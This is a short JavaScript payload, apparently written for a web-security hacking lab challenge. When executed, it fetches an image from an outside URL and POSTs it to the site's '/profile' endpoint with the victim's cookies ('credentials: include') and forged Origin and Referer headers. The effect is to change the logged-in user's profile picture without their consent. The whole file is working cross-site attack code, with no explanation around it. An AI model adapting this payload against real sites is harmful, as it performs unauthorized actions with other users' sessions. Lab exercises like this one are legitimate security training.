var imgURL = 'https://www.webempresa.com/foro/wp-content/uploads/wpforo/attachments/3200/318277=80538-Sin_imagen_disponible.jpg';


async function cambiarImagenPerfil() {
    try {
        
        const response = await fetch(imgURL);
        const blob = await response.blob();

        
        const formData = new FormData();
        formData.append('profile_pic', blob, 'new_profile.jpg');

        headers = {
          "Origin": "https://chl-a462b31e-e114-45ad-8452-0a5bbee78373-blog-hacklab.softwareseguro.com.ar",
          "Referer": "https://chl-a462b31e-e114-45ad-8452-0a5bbee78373-blog-hacklab.softwareseguro.com.ar/profile"
        }
        
        await fetch('/profile', {
            method: 'POST',
            body: formData,
            headers: headers,
            credentials: 'include' 
        });

        console.log('Imagen de perfil cambiada con éxito.');
    } catch (error) {
        console.error('Error al cambiar la imagen de perfil:', error);
    }
}


cambiarImagenPerfil();